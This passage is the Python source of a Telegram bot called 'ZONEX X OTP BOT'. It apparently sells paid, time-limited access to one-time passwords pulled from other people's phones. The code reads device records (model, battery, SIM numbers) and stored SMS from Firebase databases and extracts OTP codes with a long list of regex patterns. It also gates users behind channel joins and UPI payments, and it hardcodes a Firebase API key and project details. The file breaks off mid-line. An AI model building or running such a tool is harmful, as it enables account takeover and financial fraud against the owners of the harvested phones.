#!/usr/bin/env python3
"""
╔══════════════════════════════════════════╗
║        ZONEX X OTP BOT v4.6                 ║
║  Channel Gate · Key Entry · Time Plans   ║
║  Referral · Multi-Firebase · Admin Panel ║
╚══════════════════════════════════════════╝
"""

import os, re, json, logging, string, random, asyncio
from datetime import datetime, timedelta, timezone
from typing import Optional
import aiohttp
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ChatMember
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    ContextTypes, MessageHandler, filters, ConversationHandler
)
from telegram.error import TelegramError

# ─── Config ───────────────────────────────────────────────────────────────────
BOT_TOKEN      = os.getenv("BOT_TOKEN", "")
ADMIN_IDS      = [int(x) for x in os.getenv("ADMIN_IDS","8917259924").split(",") if x.strip()]
ADMIN_USERNAME = "@AG14447"
BOT_DEV        = "@zonexarmy"
DATA_FILE      = "bot/data.json"
AUTO_REFRESH   = 10

# ─── Firebase Configuration (UPDATED with your config) ─────────────────────
FIREBASE_CONFIG = {
    "apiKey": "AIzaSyDiMcsz86sfFSCxxKWlPDESY7aEmmt6wcc",
    "authDomain": "era-ka-store.firebaseapp.com",
    "projectId": "era-ka-store",
    "storageBucket": "era-ka-store.firebasestorage.app",
    "messagingSenderId": "540743058625",
    "appId": "1:540743058625:web:d0938c9cfa3e4750e48040",
    "measurementId": "G-QZGN0SFYHC",
    "databaseURL": "https://era-ka-store-default-rtdb.firebaseio.com"  # Added for RTDB
}

# Use API Key from config
GAPI_KEY = FIREBASE_CONFIG["apiKey"]
FS_PROJECT = FIREBASE_CONFIG["projectId"]
FS_RTDB_URL = f"https://{FS_PROJECT}-default-rtdb.firebaseio.com/bot_data.json"

DEVICES_PER_PAGE = 6
WELCOME_HOURS  = 1

CHANNELS = ["eraXearning", "eraXarmy"]   # force-join channels (without @)
CH_NAMES = {
    "zonexarmy": "𝐙𝐎𝐍𝐄𝐗 𝐀𝐫𝐞𝐚 💸💸",
    "SMARTEARNERS011":    "SMART EARNERS",
}

# ─── Conversation states ──────────────────────────────────────────────────────
WAIT_KEY        = 10
WAIT_FB_URL     = 20
WAIT_FB_LABEL   = 21
WAIT_BROADCAST  = 30
WAIT_PLAN_TIME  = 40
WAIT_PLAN_PRICE = 41
WAIT_ADD_TIME   = 50

logging.basicConfig(format="%(asctime)s | %(levelname)s | %(message)s",
                    level=logging.INFO, datefmt="%Y-%m-%d %H:%M:%S")
logger = logging.getLogger(__name__)

# ─── Refresh lock ────────────────────────────────────────────────────────────
_refresh_lock: asyncio.Lock = None

# ─── Key generator ────────────────────────────────────────────────────────────
def _gen_key_raw(length=10) -> str:
    return "ERAX-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=length))

# ─── Persistent Storage ───────────────────────────────────────────────────────
def _default_data() -> dict:
    return {
        "users": {},
        "firebase_configs": [
            {"url": "https://paisa-8e4f4-default-rtdb.firebaseio.com",
             "label": "Main DB", "key": ""}
        ],
        "pricing_plans": [
            {"id": "p1", "hours": 24,  "price": 30,  "label": "1 Din (24h)"},
            {"id": "p2", "hours": 168, "price": 100, "label": "7 Din (168h)"},
            {"id": "p3", "hours": 720, "price": 500, "label": "30 Din (720h)"},
        ],
        "referral_hours": 1,
        "upi_id": "",
        "qr_file_id": "",
        "pending_payments": {},
        "maintenance": False,
    }

def load_data() -> dict:
    try:
        if os.path.exists(DATA_FILE):
            with open(DATA_FILE) as f:
                d = json.load(f)
            d.pop("activation_codes", None)
            for uid, u in d.get("users", {}).items():
                u.setdefault("key",            _gen_key_raw())
                u.setdefault("expires_at",     None)
                u.setdefault("referred_by",    None)
                u.setdefault("referral_count", 0)
                u.setdefault("channels_done",  False)
                u.setdefault("key_verified",   False)
                u.setdefault("banned",         False)
            d.setdefault("pricing_plans", _default_data()["pricing_plans"])
            d.setdefault("referral_hours", 1)
            d.setdefault("upi_id", "")
            d.setdefault("qr_file_id", "")
            d.setdefault("pending_payments", {})
            d.setdefault("maintenance", False)
            return d
    except Exception as e:
        logger.error(f"load_data: {e}")
    return _default_data()

def save_data(d: dict):
    os.makedirs(os.path.dirname(DATA_FILE), exist_ok=True)
    with open(DATA_FILE, "w") as f:
        json.dump(d, f, indent=2)
    # Push to Firebase Realtime Database
    try:
        loop = asyncio.get_running_loop()
        loop.create_task(_push_firestore(d))
    except RuntimeError:
        pass  # No running loop yet

async def _push_firestore(d: dict):
    """Push bot data to Firebase Realtime Database with your API key."""
    if not GAPI_KEY:
        logger.warning("⚠️ GAPI_KEY not set! Data not saved to Firebase.")
        return
    
    try:
        payload = json.dumps(d, separators=(",", ":"))
        # Use your actual Firebase API key for authentication
        url = f"{FS_RTDB_URL}?auth={GAPI_KEY}"
        
        async with _get_session().put(url, data=payload,
                         headers={"Content-Type": "application/json"}) as r:
            if r.status in (200, 201):
                logger.info("✅ Firebase RTDB save successful")
            else:
                body = await r.text()
                logger.warning(f"❌ Firebase RTDB save failed: {r.status} - {body[:200]}")
    except Exception as e:
        logger.warning(f"❌ Firebase RTDB push error: {e}")

async def _load_firestore() -> bool:
    """Load bot data from Firebase Realtime Database on startup."""
    if not GAPI_KEY:
        logger.warning("⚠️ GAPI_KEY not set! Using local data only.")
        return False
    
    try:
        url = f"{FS_RTDB_URL}?auth={GAPI_KEY}"
        async with _get_session().get(url) as r:
            if r.status == 200:
                d = await r.json()
                if not isinstance(d, dict):
                    return False
                
                # Apply migrations
                d.pop("activation_codes", None)
                for uid, u in d.get("users", {}).items():
                    u.setdefault("key",            _gen_key_raw())
                    u.setdefault("expires_at",     None)
                    u.setdefault("referred_by",    None)
                    u.setdefault("referral_count", 0)
                    u.setdefault("channels_done",  False)
                    u.setdefault("key_verified",   False)
                    u.setdefault("banned",         False)
                d.setdefault("pricing_plans",    _default_data()["pricing_plans"])
                d.setdefault("referral_hours",   1)
                d.setdefault("upi_id",           "")
                d.setdefault("qr_file_id",       "")
                d.setdefault("pending_payments", {})
                d.setdefault("maintenance",      False)
                
                global data
                data = d
                
                # Write local backup
                os.makedirs(os.path.dirname(DATA_FILE), exist_ok=True)
                with open(DATA_FILE, "w") as f:
                    json.dump(d, f, indent=2)
                
                logger.info(f"✅ Firebase RTDB load OK — {len(d.get('users',{}))} users")
                return True
            elif r.status == 401:
                logger.error(f"❌ Firebase auth failed! Check API key: {GAPI_KEY[:10]}...")
            elif r.status == 404:
                logger.info("ℹ️ Firebase: No cloud data yet, will create on first save")
            else:
                body = await r.text()
                logger.warning(f"Firebase load: {r.status} - {body[:120]}")
    except Exception as e:
        logger.warning(f"Firebase load error: {e}")
    return False

# Load data (will try Firebase first, then fallback to local)
data = load_data()

# Try to load from Firebase on startup (async, will be called in _on_startup)
async def _sync_from_firebase_on_startup():
    """Try to load from Firebase on startup"""
    loaded = await _load_firestore()
    if not loaded:
        logger.info("⚠️ Using local data.json (Firebase not available or empty)")
    else:
        logger.info("✅ Using Firebase data")

# ─── Helper functions ─────────────────────────────────────────────────────────
def get_referral_hours() -> float:
    return float(data.get("referral_hours", 1))

# ─── Cache ────────────────────────────────────────────────────────────────────
device_cache: dict   = {}
otp_cache:    dict   = {}
last_refresh         = "Never"
fb_last_sync: dict   = {}   # label -> "HH:MM:SS" when last synced
fb_conn_status: dict = {}   # label -> "ok" | "error" | "timeout" | "auth"

# ─── Global HTTP session ─────────────────────────────────────────────────────
_http_session: Optional[aiohttp.ClientSession] = None

def _get_session() -> aiohttp.ClientSession:
    global _http_session
    if _http_session is None or _http_session.closed:
        connector = aiohttp.TCPConnector(
            limit=30,
            ttl_dns_cache=300,
            enable_cleanup_closed=True,
        )
        _http_session = aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=6),
        )
    return _http_session

# ─── Time helpers ─────────────────────────────────────────────────────────────
IST = timezone(timedelta(hours=5, minutes=30))

def now_dt() -> datetime:
    return datetime.now(IST).replace(tzinfo=None)

def now_str() -> str:
    return now_dt().strftime("%Y-%m-%d %H:%M:%S")

def expires_dt(uid: int) -> Optional[datetime]:
    s = data["users"].get(str(uid), {}).get("expires_at")
    if not s: return None
    try: return datetime.strptime(s, "%Y-%m-%d %H:%M:%S")
    except: return None

def time_left_str(uid: int) -> str:
    if is_admin(uid): return "∞ Unlimited"
    exp = expires_dt(uid)
    if not exp: return "❌ No Access"
    diff = exp - now_dt()
    if diff.total_seconds() <= 0: return "⏰ Expired"
    h = int(diff.total_seconds() // 3600)
    m = int((diff.total_seconds() % 3600) // 60)
    if h >= 24:
        return f"✅ {h//24}d {h%24}h {m}m"
    return f"✅ {h}h {m}m"

def time_left_detailed(uid: int) -> str:
    if is_admin(uid): return "∞ Unlimited"
    exp = expires_dt(uid)
    if not exp: return "❌ No Access"
    diff = exp - now_dt()
    if diff.total_seconds() <= 0:
        return f"⏰ Expired ({exp.strftime('%d/%m %H:%M')})"
    h = int(diff.total_seconds() // 3600)
    m = int((diff.total_seconds() % 3600) // 60)
    exp_str = exp.strftime('%d/%m/%Y %H:%M')
    if h >= 24:
        return f"✅ {h//24}d {h%24}h {m}m left\n   📅 Expires: {exp_str}"
    return f"✅ {h}h {m}m left\n   📅 Expires: {exp_str}"

def add_hours(uid: int, hours: float):
    exp = expires_dt(uid)
    base = now_dt() if (not exp or exp < now_dt()) else exp
    new_exp = base + timedelta(hours=hours)
    if new_exp < now_dt() and hours < 0:
        new_exp = now_dt() - timedelta(seconds=1)
    data["users"][str(uid)]["expires_at"] = new_exp.strftime("%Y-%m-%d %H:%M:%S")
    save_data(data)

def set_expiry(uid: int, dt: datetime):
    data["users"][str(uid)]["expires_at"] = dt.strftime("%Y-%m-%d %H:%M:%S")
    save_data(data)

# ─── User helpers ─────────────────────────────────────────────────────────────
def is_admin(uid: int) -> bool:
    return uid in ADMIN_IDS

def is_banned(uid: int) -> bool:
    return bool(data["users"].get(str(uid), {}).get("banned", False))

def has_access(uid: int) -> bool:
    if is_admin(uid): return True
    if is_banned(uid): return False
    exp = expires_dt(uid)
    return bool(exp and exp > now_dt())

def ensure_user(uid: int, username: str, name: str, referred_by: Optional[int] = None) -> dict:
    uid_s = str(uid)
    if uid_s not in data["users"]:
        key = _gen_key_raw()
        while any(u.get("key") == key for u in data["users"].values()):
            key = _gen_key_raw()
        data["users"][uid_s] = {
            "username": username or "", "name": name or "",
            "joined": now_str(), "key": key,
            "expires_at": None, "referred_by": referred_by,
            "referral_count": 0, "channels_done": False,
            "key_verified": False, "banned": False,
        }
        save_data(data)
    return data["users"][uid_s]

def get_key(uid: int) -> str:
    return data["users"].get(str(uid), {}).get("key", "—")

# ─── Channel helpers ──────────────────────────────────────────────────────────
async def check_channels(bot, uid: int) -> tuple[bool, list[str]]:
    missing = []
    for ch in CHANNELS:
        try:
            m = await bot.get_chat_member(f"@{ch}", uid)
            if m.status in (ChatMember.LEFT, ChatMember.BANNED):
                missing.append(ch)
        except TelegramError:
            pass
    return len(missing) == 0, missing

def kb_channels(missing: list[str]) -> InlineKeyboardMarkup:
    rows = []
    for ch in missing:
        rows.append([InlineKeyboardButton(CH_NAMES.get(ch, f"@{ch}"), url=f"https://t.me/{ch}")])
    rows.append([InlineKeyboardButton("✅ Continue Verify", callback_data="check_join")])
    return InlineKeyboardMarkup(rows)

# ─── OTP helpers ──────────────────────────────────────────────────────────────
def extract_otp(text: str) -> Optional[str]:
    pats = [
        r'(?:OTP|One[\s\-]?Time[\s\-]?Password)\s*(?:is|:|\s)\s*(\d{4,8})',
        r'(\d{4,8})\s+(?:is\s+)?(?:your|the)\s+(?:OTP|One[\s\-]?Time)',
        r'(?:verification\s+code|verify\s+code|auth\s+code|login\s+code)\s*[:\-]?\s*(\d{4,8})',
        r'(?:code|passcode|security\s+code|access\s+code)\s*[:\-]\s*(\d{4,8})',
        r'(?:your|the)\s+(?:OTP|code|PIN|passcode)\s+(?:is\s+)?(\d{4,8})',
        r'(?:PIN|pin)\s*[:\-]\s*(\d{4,8})',
        r'\b(\d{6})\s+(?:is\s+)?(?:your|the|this)\b',
        r'(?:is|:)\s+(\d{6})\b',
        r'(?:is|:)\s+(\d{4})\b',
        r'(?:is|:)\s+(\d{8})\b',
        r'(?:is|:)\s+(\d{5})\b',
        r'(?:use|enter|share)\s+(?:this\s+)?(?:OTP|code)\s*[:\-]?\s*(\d{4,8})',
        r'(?:do not|dont|never)\s+share.*?(\d{6})',
        r'(?:do not|dont|never)\s+share.*?(\d{4})',
        r'(?:do not|dont|never)\s+share.*?(\d{8})',
        r'valid\s+for.*?(\d{6})',
        r'expires?\s+in.*?(\d{6})',
        r'\b(\d{6})\b',
        r'\b(\d{8})\b',
        r'\b(\d{5})\b',
        r'\b(\d{4})\b',
    ]
    skip = {
        '2023','2024','2025','2026','2027','2028','2029','2030',
        '1234','0000','1111','2222','3333','4444','5555','6666','7777','8888','9999',
        '12345','123456','000000','111111',
    }
    for p in pats:
        m = re.search(p, text, re.IGNORECASE)
        if m and m.group(1) not in skip:
            return m.group(1)
    return None

def _parse_ts_dt(ts) -> Optional[datetime]:
    try:
        if isinstance(ts, (int, float)):
            t = int(ts)
            if t < 1e12: t *= 1000
            return datetime.utcfromtimestamp(t / 1000) + timedelta(hours=5, minutes=30)
        if isinstance(ts, str) and ts.strip():
            clean = ts.replace(" | ", " ").replace("|", " ").strip()
            for fmt in ("%Y-%m-%dT%H:%M:%S", "%d/%m/%Y %H:%M:%S",
                        "%d-%m-%Y %H:%M:%S", "%d/%m/%Y, %H:%M:%S",
                        "%d-%m-%Y %H:%M", "%d/%m/%Y %H:%M",
                        "%Y-%m-%d %H:%M:%S", "%Y-%m-%d %H:%M"):
                try: return datetime.strptime(clean[:19], fmt)
                except: pass
    except: pass
    return None

def fmt_ts(ts) -> str:
    try:
        if isinstance(ts, (int, float)):
            t = int(ts)
            if t < 1e12: t *= 1000
            return (datetime.utcfromtimestamp(t/1000) + timedelta(hours=5, minutes=30)).strftime("%d/%m/%Y %H:%M")
        if isinstance(ts, str) and ts.strip():
            clean = ts.replace(" | ", " ").replace("|", " ").strip()
            for fmt in ("%Y-%m-%dT%H:%M:%S", "%d/%m/%Y %H:%M:%S",
                        "%d-%m-%Y %H:%M:%S", "%d/%m/%Y, %H:%M:%S",
                        "%d-%m-%Y %H:%M", "%d/%m/%Y %H:%M",
                        "%Y-%m-%d %H:%M:%S", "%Y-%m-%d %H:%M"):
                try: return datetime.strptime(clean[:19], fmt).strftime("%d/%m/%Y %H:%M")
                except: pass
            return clean[:16]
    except: pass
    return "—"

# ─── Firebase ─────────────────────────────────────────────────────────────────
async def fb_get(url: str, path: str, key: str = "") -> Optional[dict]:
    base = url.rstrip("/")
    ep   = f"{base}/{path}.json" + (f"?auth={key}" if key else "")
    try:
        async with _get_session().get(ep) as r:
            return await r.json() if r.status == 200 else None
    except Exception as e:
        logger.warning(f"fb_get [{path}]: {e}")
    return None

async def fetch_otps(url: str, key: str, dev_id: str):
    raw = await fb_get(url, f"messages/{dev_id}", key)
    if raw is None:
        raw = await fb_get(url, f"clients/{dev_id}/messages", key)
    if not isinstance(raw, dict): return [], None

    otps: list  = []
    last_any_dt = None

    for msg in reversed(list(raw.values())[-50:]):
        if not isinstance(msg, dict): continue
        body   = str(msg.get("message") or msg.get("body") or msg.get("text") or "")
        sender = str(msg.get("sender") or msg.get("from") or msg.get("address") or "Unknown")
        ts     = msg.get("dateTime") or msg.get("date") or msg.get("timestamp") or ""
        msg_dt = _parse_ts_dt(ts)

        if msg_dt and (last_any_dt is None or msg_dt > last_any_dt):
            last_any_dt = msg_dt

        otp = extract_otp(body)
        if otp:
            otps.append({
                "otp": otp, "sender": sender,
                "time": fmt_ts(ts), "msg": body[:300],
                "_dt": msg_dt,
            })
    return otps, last_any_dt

async def refresh_firebase(cfg: dict):
    url, key, label = cfg["url"], cfg.get("key",""), cfg["label"]
    clients = await fb_get(url, "clients", key)
    if not isinstance(clients, dict): return

    today = now_dt().date()

    valid = []
    for dev_id, info in clients.items():
        if not isinstance(info, dict): continue
        sims = info.get("sims") or {}
        sl   = sims if isinstance(sims, list) else list(sims.values())
        def _pick(*vals):
            for v in vals:
                s = str(v).strip()
                if s and s not in ("None","none","","—","-","Unknown","unknown","null"):
                    return s
            return "—"
        sim_phone = sl[0].get("phoneNumber") or sl[0].get("phone") or sl[0].get("number","") if sl else ""
        phone = _pick(
            info.get("mobNo"), info.get("phoneNumber"), info.get("phone"),
            info.get("mobile"), info.get("Mobile"), info.get("phone_number"),
            info.get("PhoneNumber"), sim_phone,
        )
        valid.append((dev_id, info, phone))

    async def _fetch_one(dev_id):
        try:
            return await fetch_otps(url, key, dev_id)
        except Exception as e:
            logger.warning(f"fetch_otps [{dev_id}]: {e}")
            return [], None

    results = await asyncio.gather(*[_fetch_one(dev_id) for dev_id, _, _ in valid])

    devs, otps_map = {}, {}
    for (dev_id, info, phone), (raw_otps, _last_msg_dt) in zip(valid, results):
        phone_ok = _has_valid_phone({"phone": phone})
        fb_status = bool(info.get("status") or info.get("isOnline") or
                         info.get("is_online") or info.get("online"))
        is_online  = fb_status and phone_ok

        ts_raw = (info.get("lastSeen") or info.get("last_seen") or
                  info.get("lastOnline") or "")
        devs[dev_id] = {
            "online":    is_online,
            "phone":     phone,
            "name":      str(info.get("modelName") or info.get("model") or dev_id),
            "battery":   str(info.get("battery","—")),
            "android":   str(info.g
